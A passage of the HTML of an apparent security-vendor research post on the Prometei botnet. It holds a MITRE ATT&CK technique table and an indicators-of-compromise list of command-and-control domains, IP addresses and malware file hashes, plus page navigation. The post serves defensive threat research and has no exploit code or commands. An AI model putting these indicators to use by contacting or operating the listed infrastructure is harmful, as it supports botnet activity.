<p style="text-align: center;"><span style="font-size: 14px;"><strong><span style="color: #596a6f;">Defense Evasion</span></strong></span></p>
</td>
<td style="background-color: #eeeeee; border: 0.75pt solid #99acc2; width: 128px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><strong><span style="color: #596a6f;">Credential Access</span></strong></span></p>
</td>
<td style="background-color: #eeeeee; border: 0.75pt solid #99acc2; width: 117px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><strong><span style="color: #596a6f;">Discovery</span></strong></span></p>
</td>
<td style="background-color: #eeeeee; border: 0.75pt solid #99acc2; width: 116px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><strong><span style="color: #596a6f;">Lateral Movement</span></strong></span></p>
</td>
<td style="background-color: #eeeeee; border: 0.75pt solid #99acc2; width: 100px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><strong><span style="color: #596a6f;">Command &amp; Control</span></strong></span></p>
</td>
<td style="background-color: #eeeeee; border: 0.75pt solid #99acc2; width: 93px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><strong><span style="color: #596a6f;">Impact</span></strong></span></p>
</td>
</tr>
<tr>
<td style="border: 0.75pt solid #99acc2; width: 115px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1190/" rel="noopener" target="_blank">Exploit Public-Facing Application</a></span></p>
</td>
<td style="border: 0.75pt solid #99acc2; width: 132px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1569/" rel="noopener" target="_blank">System Services</a></span></p>
</td>
<td style="border: 0.75pt solid #99acc2; width: 120px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1543/003/" rel="noopener" target="_blank">Create or Modify System Process: Windows Service</a></span></p>
</td>
<td style="border: 0.75pt solid #99acc2; width: 136px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1036/" rel="noopener" target="_blank">Masquerading</a></span></p>
</td>
<td style="border: 0.75pt solid #99acc2; width: 128px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1555/" rel="noopener" target="_blank">Credentials from Password Stores</a></span></p>
</td>
<td style="border: 0.75pt solid #99acc2; width: 117px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1082/" rel="noopener" target="_blank">System Information Discovery</a></span></p>
</td>
<td style="border: 0.75pt solid #99acc2; width: 116px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1210/" rel="noopener" target="_blank">Exploitation of Remote Services</a></span></p>
</td>
<td style="border: 0.75pt solid #99acc2; width: 100px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1071/" rel="noopener" target="_blank">Application Layer Protocol</a></span></p>
</td>
<td style="border: 0.75pt solid #99acc2; width: 93px; padding: 4px;">
<p style="text-align: center; font-size: 12px;"><a href="https://attack.mitre.org/techniques/T1496/" rel="noopener" target="_blank">Resource Hijacking</a></p>
</td>
</tr>
<tr>
<td style="border: 0.75pt solid #99acc2; width: 115px; padding: 4px;">&nbsp;</td>
<td style="border: 0.75pt solid #99acc2; width: 132px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1106/" rel="noopener" target="_blank">Native API</a></span></p>
</td>
<td style="border: 0.75pt solid #99acc2; width: 120px; padding: 4px;">&nbsp;</td>
<td style="border: 0.75pt solid #99acc2; width: 136px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1078/" rel="noopener" target="_blank">Valid Accounts</a></span></p>
</td>
<td style="border: 0.75pt solid #99acc2; width: 128px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1003/" rel="noopener" target="_blank">OS Credential Dumping</a></span></p>
</td>
<td style="border: 0.75pt solid #99acc2; width: 117px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1007/" rel="noopener" target="_blank">System Service Discovery</a></span></p>
</td>
<td style="border: 0.75pt solid #99acc2; width: 116px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1570/" rel="noopener" target="_blank">Lateral Tool Transfer</a></span></p>
</td>
<td style="border: 0.75pt solid #99acc2; width: 100px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1132/" rel="noopener" target="_blank">Data Encoding</a></span></p>
</td>
<td style="border: 0.75pt solid #99acc2; width: 93px; padding: 4px;">&nbsp;</td>
</tr>
<tr>
<td style="border: 0.75pt solid #99acc2; width: 115px; padding: 4px;">&nbsp;</td>
<td style="border: 0.75pt solid #99acc2; width: 132px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1047/" rel="noopener" target="_blank">Windows Management Instrumentation</a></span></p>
</td>
<td style="border: 0.75pt solid #99acc2; width: 120px; padding: 4px;">&nbsp;</td>
<td style="border: 0.75pt solid #99acc2; width: 136px; padding: 4px;">&nbsp;</td>
<td style="border: 0.75pt solid #99acc2; width: 128px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1552/" rel="noopener" target="_blank">Unsecured Credentials</a></span></p>
</td>
<td style="border: 0.75pt solid #99acc2; width: 117px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1135/" rel="noopener" target="_blank">Network Share Discovery</a></span></p>
</td>
<td style="border: 0.75pt solid #99acc2; width: 116px; padding: 4px;">&nbsp;</td>
<td style="border: 0.75pt solid #99acc2; width: 100px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1104/" rel="noopener" target="_blank">Multi-Stage Channels</a></span></p>
</td>
<td style="border: 0.75pt solid #99acc2; width: 93px; padding: 4px;">&nbsp;</td>
</tr>
<tr>
<td style="border: 0.75pt solid #99acc2; width: 115px; padding: 4px;">&nbsp;</td>
<td style="border: 0.75pt solid #99acc2; width: 132px; padding: 4px;">&nbsp;</td>
<td style="border: 0.75pt solid #99acc2; width: 120px; padding: 4px;">&nbsp;</td>
<td style="border: 0.75pt solid #99acc2; width: 136px; padding: 4px;">&nbsp;</td>
<td style="border: 0.75pt solid #99acc2; width: 128px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1110/" rel="noopener" target="_blank">Brute Force</a></span></p>
</td>
<td style="border: 0.75pt solid #99acc2; width: 117px; padding: 4px;">
<p style="text-align: center;"><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1057/" rel="noopener" target="_blank">Process Discovery</a></span></p>
</td>
<td style="border: 0.75pt solid #99acc2; width: 116px; padding: 4px;">&nbsp;</td>
<td style="border: 0.75pt solid #99acc2; width: 100px; padding: 4px;">&nbsp;</td>
<td style="border: 0.75pt solid #99acc2; width: 93px; padding: 4px;">&nbsp;</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p></span>
          
          <!-- IOC PopUp Modal -->
          
          
            <div id="hs_cos_wrapper_module_162281712252340" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><!-- Button -->



<div class="cr-modal" id="iocs">
  <div class="cr-modal-overlay cr-modal-toggle"></div>
  <div class="cr-modal-wrapper cr-modal-transition">
    <div class="cr-modal-header">
      <button class="cr-modal-close cr-modal-toggle" id="ioc-close">X</button>
    </div>

    <div class="cr-modal-body">
      <div class="cr-modal-content">
        <h2 style="line-height: 1;">Prometei Botnet | Indicators of Compromise</h2>
<table xmlns="http://www.w3.org/1999/xhtml" cellpadding="4" dir="ltr" border="1" style="border-color: #99acc2; border-collapse: collapse; table-layout: fixed; margin-left: 0px; margin-right: 10px; float: left;" cellspacing="0"><colgroup><col width="234"><col width="100"><col width="100"></colgroup>
<tbody>
<tr>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Indicator&quot;}"><strong>Indicator</strong></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Type&quot;}"><strong>Type</strong></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Comment&quot;}"><strong>Comment</strong></td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;P1.feefreepool.net\nxmr.feefreepool.net\ngb7ni5rgeexdcncj.onion\nrongo.prohash.org\nbk1.bitspiritfun2.net\nmkhkjxgchtfgu7uhofxzgoawntfzrkdccymveektqgpxrpjb72oq.zero\ndummy.zero\ncp22.umbrellapool.club\n193.160.102.91.in-addr.arpa\n102.72.239.193.in-addr.arpa\n183.247.34.37.in-addr.arpa\ncp23.umbrellapool.club\nbk2.bitspiritfun2.net&quot;}" data-sheets-textstyleruns="{&quot;1&quot;:0}{&quot;1&quot;:300,&quot;2&quot;:{&quot;2&quot;:{&quot;1&quot;:2,&quot;2&quot;:0},&quot;9&quot;:0}}{&quot;1&quot;:321,&quot;2&quot;:{&quot;2&quot;:{&quot;1&quot;:2,&quot;2&quot;:1136076},&quot;9&quot;:1}}"><span>P1.feefreepool.net<br>xmr.feefreepool.net<br>gb7ni5rgeexdcncj.onion<br>rongo.prohash.org<br>bk1.bitspiritfun2.net<br>mkhkjxgchtfgu7uhofxzgoawntfzrkdccymveektqgpxrpjb72oq.zero<br>dummy.zero<br>cp22.umbrellapool.club<br>193.160.102.91.in-addr.arpa<br>102.72.239.193.in-addr.arpa<br>183.247.34.37.in-addr.arpa<br>cp23.umbrellapool.club<br></span><span>bk2.bitspiritfun2.net</span></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Domain&quot;}">Domain</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;C2&quot;}">C2</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;217.165.8.218\n77.92.138.51\n91.102.160.193\n103.11.244.221\n121.200.54.85\n112.109.89.53\n178.21.164.68\n69.84.240.57\n208.66.132.3 &quot;}">217.165.8.218<br>77.92.138.51<br>91.102.160.193<br>103.11.244.221<br>121.200.54.85<br>112.109.89.53<br>178.21.164.68<br>69.84.240.57<br>208.66.132.3</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;IP&quot;}">IP</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;C2&quot;}">C2</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;f0a5b257f16c4ccff520365ebc143f09ccf233e642bf540b5b90a2bbdb43d5b4&quot;}">f0a5b257f16c4ccff520365ebc143f09ccf233e642bf540b5b90a2bbdb43d5b4</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;SHA256&quot;}">SHA256</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Sqhost.exe / zsvc.exe&quot;}">
<div>
<div>Sqhost.exe / zsvc.exe</div>
</div>
</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;d8e3e22997533300c097b47d71feeda51dca183c35a0d818faa12ee903e969d5&quot;}">d8e3e22997533300c097b47d71feeda51dca183c35a0d818faa12ee903e969d5</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;SHA256&quot;}">SHA256</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;ExchDefender.exe&quot;}">
<div>
<div>ExchDefender.exe</div>
</div>
</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;b0e743517e7abf75a80b81bb7aadc9c166ac47ba89c0654ba855dda1e4d96c3e&quot;}">b0e743517e7abf75a80b81bb7aadc9c166ac47ba89c0654ba855dda1e4d96c3e</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;SHA256&quot;}">SHA256</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;SearchIndexer.exe&quot;}">
<div>
<div>SearchIndexer.exe</div>
</div>
</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;55fc69a7e1b2371d8762be0b4f403d32db24902891fdbfb8b7d2b7fd1963f1b4&quot;}">55fc69a7e1b2371d8762be0b4f403d32db24902891fdbfb8b7d2b7fd1963f1b4</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;SHA256&quot;}">SHA256</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Netwalker.7z&quot;}">Netwalker.7z</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;e4bd40643f64ac5e8d4093bddee0e26fcc74d2c15ba98b505098d13da22015f5&quot;}">e4bd40643f64ac5e8d4093bddee0e26fcc74d2c15ba98b505098d13da22015f5</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;SHA256&quot;}">SHA256</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;RdpcIip.exe&quot;}">RdpcIip.exe</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;fb8f100e646dec8f19cb439d4020b5f5f43afdc2414279296e13469f13a018ca&quot;}">fb8f100e646dec8f19cb439d4020b5f5f43afdc2414279296e13469f13a018ca</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;SHA256&quot;}">SHA256</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Miwalk&quot;}">Miwalk</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;f86f9d0d3ea06bd4be6ee84c09bd13e43ecfcc71653d15994a39e55c2d6bd664\ne961c07d534bc1cb96f159fce573fc671bd188cef8756ef32acd9afb49528331&quot;}">f86f9d0d3ea06bd4be6ee84c09bd13e43ecfcc71653d15994a39e55c2d6bd664<br>e961c07d534bc1cb96f159fce573fc671bd188cef8756ef32acd9afb49528331</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;SHA256&quot;}">SHA256</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Bklocal2.exe / Bklocal4.exe&quot;}">
<div>
<div>Bklocal2.exe / Bklocal4.exe</div>
</div>
</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;2f114862bd999c38b69b633488bcbb6c74c9a11e28b7ef335f6c77bba32ed2d6\n5de7afdde08f7b8ba705c8332c693747d537fd5b1bb0e7b0c757c0f364a60eb8&quot;}">2f114862bd999c38b69b633488bcbb6c74c9a11e28b7ef335f6c77bba32ed2d6<br>5de7afdde08f7b8ba705c8332c693747d537fd5b1bb0e7b0c757c0f364a60eb8</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;SHA256&quot;}">SHA256</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Nethelper2.exe / Nethelper4.exe&quot;}">
<div>
<div>Nethelper2.exe / Nethelper4.exe</div>
</div>
</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;dc73a88f544efc943da73c9f6535facdb61800f6205ad3dddb9adb7c6ab229ab&quot;}">dc73a88f544efc943da73c9f6535facdb61800f6205ad3dddb9adb7c6ab229ab</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;SHA256&quot;}">SHA256</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Windrlver.exe&quot;}">Windrlver.exe</td>
</tr>
</tbody>
</table>
      </div>
    </div>
  </div>
</div></div>
          
          
          <!-- -->
          
          <!-- Social Share -->
          <div class="cr-blog-post__social-sharing">
            <span>Share</span>
            <div id="hs_cos_wrapper_module_161724375084957" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module widget-type-social_sharing" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">






<div class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_social_sharing" data-hs-cos-general-type="widget" data-hs-cos-type="social_sharing">
  
	
  
    
    
    
			
		

    <a href="https://twitter.com/intent/tweet?original_referer=https://www.cybereason.com/blog/research/prometei-botnet-exploiting-microsoft-exchange-vulnerabilities&amp;utm_medium=social&amp;utm_source=twitter&amp;url=https://www.cybereason.com/blog/research/prometei-botnet-exploiting-microsoft-exchange-vulnerabilities&amp;utm_medium=social&amp;utm_source=twitter&amp;source=tweetbutton&amp;text=" target="_blank" rel="noopener" style="width:16px;">
      <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/twitter-gray.svg" class="hs-image-widget hs-image-social-sharing-24" style="height:16px;width:16px;" width="16" hspace="0" alt="Share on twitter">
    </a>
	

  
	
  
    
    
    
			
		

    <a href="http://www.facebook.com/share.php?u=https://www.cybereason.com/blog/research/prometei-botnet-exploiting-microsoft-exchange-vulnerabilities&amp;utm_medium=social&amp;utm_source=facebook" target="_blank" rel="noopener" style="width:16px;">
      <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/facebook-gray.svg" class="hs-image-widget hs-image-social-sharing-24" style="height:16px;width:16px;" width="16" hspace="0" alt="Share on facebook">
    </a>
	

  
	
  
    
    
    
			
		

    <a href="http://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.cybereason.com/blog/research/prometei-botnet-exploiting-microsoft-exchange-vulnerabilities&amp;utm_medium=social&amp;utm_source=linkedin" target="_blank" rel="noopener" style="width:16px;">
      <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/linkedin-gray.svg" class="hs-image-widget hs-image-social-sharing-24" style="height:16px;width:16px;" width="16" hspace="0" alt="Share on linkedin">
    </a>
	

</div></div>
          </div> 
          
          
          <!-- CONDITIONAL Author Box Display -->
            <div class="container columns cr-mln__author-listing-single">
              
                <div class="column headshot is-3-full-hd is-3-desktop is-3-tablet is-12-mobile">
                  <img class="cr-speaker-headshot" src="https://www.cybereason.com/hubfs/Lior-R-HS-1.png" alt="Lior Rochberger">
                </div>
              
              <div class="column is-9-full-hd is-9-desktop is-12-mobile">
                <span class="descriptor">About the Author</span>
                <h4>Lior Rochberger</h4>
                
                  <a class="social" href="https://il.linkedin.com/in/lior-rochberger" target="_blank">
                    <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/icon-social-gray-linkedin.png">
                  </a>
                
                
                  <a class="social" href="https://twitter.com/lior_rochberger" target="_blank">
                    <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/icon-social-gray-twitter.svg">
                  </a>
                
                
                  <p>Lior is a senior threat researcher at Cybereason, focusing on threat hunting and malware research. Lior began her career as a team leader in the security operations center in the Israeli Air Force where she mostly focused on incident response and malware analysis.</p>
                
                
                  <a class="cr-button cr-button__min" href="https://www.cybereason.com/blog/authors/lior-rochberger">All Posts by Lior Rochberger</a>
                
              </div>            
            </div>
          
        <!-- CONDITIONAL Post Type Choices -->
        
        <!-- Malicious Life Post -->
        
        
        <!-- CISO Stories -->
        
        <!-- Webinar -->
        
          
        <!-- CONDITIONAL Transcript -->
          
        
         <!-- Related Posts -->
        <div id="hs_cos_wrapper_module_1649342860525315" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">
<section class="cr-section related-posts__wrapper">
  <div class="container container-is-blog page-center">
     <h3>Related Posts</h3>
     <div class="columns is-multiline">
       
  
 <div class="column is-6-fullhd is-6-desktop is-full-mobile blog-listing__single-post">
  <div class="text-content-bundle">
    <a href="https://www.cybereason.com/blog/research/operation-ghostshell-novel-rat-targets-global-aerospace-and-telecoms-firms"><img src="https://www.cybereason.com/hubfs/BLOG%20%20SOCIAL%20SET%20-%20News%20%281%29-1.png" alt="Operation GhostShell: Novel RAT Targets Global Aerospace and Telecoms Firms"></a>
    <h4><a href="https://www.cybereason.com/blog/research/operation-ghostshell-novel-rat-targets-global-aerospace-and-telecoms-firms"><span class="underline">Operation GhostShell: Novel RAT Targets Global Aerospace and Telecoms Firms</span></a></h4>
     <p>The highly-targeted attacks against aerospace and telecoms firms by new Iranian threat actor MalKamak includes newly discovered malware that evaded security tools since 2018 and abuses Dropbox services for command and control...</p>
   </div>
 </div>


  
 <div class="column is-6-fullhd is-6-desktop is-full-mobile blog-listing__single-post">
  <div class="text-content-bundle">
    <a href="https://www.cybereason.com/blog/beware-of-the-messengers-exploiting-activemq-vulnerability"><img src="https://www.cybereason.com/hubfs/dam/images/images-web/featured-images/activemq-blog-featured.png" alt="Beware of the Messengers, Exploiting ActiveMQ Vulnerability"></a>
    <h4><a href="https://www.cybereason.com/blog/beware-of-the-messengers-exploiting-activemq-vulnerability"><span class="underline">Beware of the Messengers, Exploiting ActiveMQ Vulnerability</span></a></h4>
     <p>In this Threat Analysis Report, Cybereason Security Services examines an incident on a Linux server, which saw malicious shell (bash) executions from a Java process running Apache ActiveMQ. </p>
   </div>
 </div>



    </div>
  </div>
</section></div>
          
          
      </div>
        
        <!-- Sidebar -->

      <div class="column is-3-fullhd is-3-desktop is-12-mobile cr-malicious-life-network__sidebar">
        <div class="cr-ml-sidebar--group">
        <div class="top-stripe"></div>
        <div class="sidebar-block search-section">
          <form action="/hs-search-results">
            <input type="search" class="hs-search-field__input" name="term" autocomplete="on" placeholder="Search">
            <input type="hidden" name="type" value="BLOG_POST">
            <input type="hidden" name="type" value="LISTING_PAGE">
            <button type="submit" class="arrow"></button>
          </form>
        </div>
        <div class="sidebar-block subscribe">
          <a href="#blog-subscribe">
            <h4>Subscribe</h4>
            <span>Never miss a blog.</span>
          </a>
        </div>

        <div class="sidebar-block recent-posts">
          <h4>Recent Posts</h4>
          
            
                <div class="recent-posts__single-post">
                    <div class="text-content-bundle">
                        <a href="https://www.cybereason.com/blog/keeping-pace-with-ai-innovation" class="post-name"><span class="underline">Are you keeping pace with Cyber Security AI innovation?</span></a>
                       
                    </div>
                </div>
            
                <div class="recent-posts__single-post">
                    <div class="text-content-bundle">
                        <a href="https://www.cybereason.com/blog/identifying-and-preventing-bin-attacks" class="post-name"><span class="underline">Cracking the Code: How to Identify, Mitigate, and Prevent BIN Attacks</span></a>
                       
                    </div>
                </div>
            
                <div class="recent-posts__single-post">
                    <div class="text-content-bundle">
                        <a href="https://www.cybereason.com/blog/zero-day-vulnerabilities-vmware" class="post-name"><span class="underline">Three Zero-Day Vulnerabilities Discovered in VMware Products</span></a>
                       
                    </div>
                </div>
            
        </div>

        <div class="sidebar-block category-listing">
          <h4>Categories</h4>
          <ul>
            <li><a href="https://www.cybereason.com/blog/category/research">Research</a></li>
            <li><a href="https://www.cybereason.com/blog/category/podcasts">Podcasts</a></li>
            <li><a href="https://www.cybereason.com/blog/category/webinars">Webinars</a></li>
            <li><a href="https://www.cybereason.com/blog/category/resources">Resources</a></li>
            <li><a href="https://www.cybereason.com/blog/category/videos">Videos</a></li>
            <li><a href="https://www.cybereason.com/blog/category/news">News</a></li>
          </ul>

          <a class="rec-category__single--view-all" href="/blog/category/research">All Posts</a>
        </div>

        
      </div><!-- END .rec-categories__all -->
      
      
      
    </div>
       
    </div>
  </div>
</div></div>

</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-2 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="display: none;" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_1616011887658867" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">
<section class="cr-section related-posts__wrapper">
  <div class="container container-is-blog page-center">
     <h3>Related Posts</h3>
     <div class="columns is-multiline">
       
  
 <div class="column is-6-fullhd is-6-desktop is-full-mobile blog-listing__single-post">
  <div class="text-content-bundle">
    <a href="https://www.cybereason.com/blog/research/operation-ghostshell-novel-rat-targets-global-aerospace-and-telecoms-firms"><img src="https://www.cybereason.com/hubfs/BLOG%20%20SOCIAL%20SET%20-%20News%20%281%29-1.png" alt="Operation GhostShell: Novel RAT Targets Global Aerospace and Telecoms Firms"></a>
    <h4><a href="https://www.cybereason.com/blog/research/operation-ghostshell-novel-rat-targets-global-aerospace-and-telecoms-firms"><span class="underline">Operation GhostShell: Novel RAT Targets Global Aerospace and Telecoms Firms</span></a></h4>
     <p>The highly-targeted attacks against aerospace and telecoms firms by new Iranian threat actor MalKamak includes newly discovered malware that evaded security tools since 2018 and abuses Dropbox services for command and control...</p>
   </div>
 </div>


  
 <div class="column is-6-fullhd is-6-desktop is-full-mobile blog-listing__single-post">
  <div class="text-content-bundle">
    <a href="https://www.cybereason.com/blog/beware-of-the-messengers-exploiting-activemq-vulnerability"><img src="https://www.cybereason.com/hubfs/dam/images/images-web/featured-images/activemq-blog-featured.png" alt="Beware of the Messengers, Exploiting ActiveMQ Vulnerability"></a>
    <h4><a href="https://www.cybereason.com/blog/beware-of-the-messengers-exploiting-activemq-vulnerability"><span class="underline">Beware of the Messengers, Exploiting ActiveMQ Vulnerability</span></a></h4>
     <p>In this Threat Analysis Report, Cybereason Security Services examines an incident on a Linux server, which saw malicious shell (bash) executions from a Java process running Apache ActiveMQ. </p>
   </div>
 </div>



    </div>
  </div>
</section></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-3 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_161767462015235" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module widget-type-blog_subscribe" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><div class="cr-mln__blog-listing-page__subscribe-footer">
  <div class="container container-is-blog columns page-center">
    <div class="column is-8-fullhd is-8-desktop is-10-tablet is-12-mobile">
      <span class="tag">NEWSLETTER</span>
      <h3>Never miss a blog</h3>
      <p>Get the latest research, expert insights, and security industry news.</p>
      <a class="cr-button cr-mln__subscribe" href="#blog-subscribe">Subscribe</a>
    </div>
    <!--<div class="column is-5-fullhd is-5-desktop is-half-tablet is-12-mobile is-offset-1-fullhd is-offset-1-desktop">
      <div class="inputs-wrapper">
        
        
      </div>
    </div>-->
  </div>
</div></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-4 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_166508001252918" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><div class="cr-sticky-cta-bar bg-black" id="sticky-bar">
  <div class="content">
    <span>Want to see the Cybereason Defense Platform in action?</span>
    <a class="cr-button cr-button__fill-yellow" href="https://www.cybereason.com/request-a-demo" target="_blank">Schedule a Demo</a>
  </div>
  <div class="close">X</div>
</div></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end body -->
</div><!--end body wrapper -->

<div class="footer-container-wrapper">
    <div class="footer-container container-fluid">

<div class="row-fluid-wrapper row-depth-1 row-number-1 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_16036762394194314" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><!-- FOOTER -->

<footer class="cr-section cr-footer cr-footer__full">
    <div class="container page-center">
      <div class="columns">
          <div class="column is-6-fullhd is-5-desktop cr-footer__col cr-footer__left">
            <div class="cr-footer__Left-logo">
              
                <a href="https://www.cybereason.com">
                  
                <img src="https://www.cybereason.com/hubfs/dam/images/images-web/logos/cr-brand/cr-logo-inline--primary-white.png">
              </a>
            </div>
          </div>
          <div class="columns column is-6-fullhd is-6-desktop cr-footer__col cr-footer__right">
            <div class="cr-footer__links-list column">
              <h4>About</h4>
              <ul>
                <li><a href="https://www.cybereason.com/company/who-we-are">Who We Are</a>
                </li><li><a href="https://www.cybereason.com/company/careers">Careers</a>
          <!-- </li><li><a href="https://www.cybereason.com/company/leadership">Leadership</a> --->
                </li><li><a href="https://www.cybereason.com/company/contact-us">Contact</a>
              </li></ul>
            </div>
            <div class="cr-footer__links-list column">
              <h4>Resources</h4>
              <ul>
                <li><a href="https://www.cybereason.com/blog">Blog</a></li>
                <li><a href="https://www.cybereason.com/resources/tag/case-study">Case Studies</a></li>
                <li><a href="https://www.cybereason.com/resources/tag/webinars">Webinars</a></li>
                <li><a href="https://www.cybereason.com/resources/tag/white-papers">White Papers</a></li>
             </ul>
            </div>
            <div class="cr-footer__links-list column">
              <h4>Platform</h4>
              <ul>
                
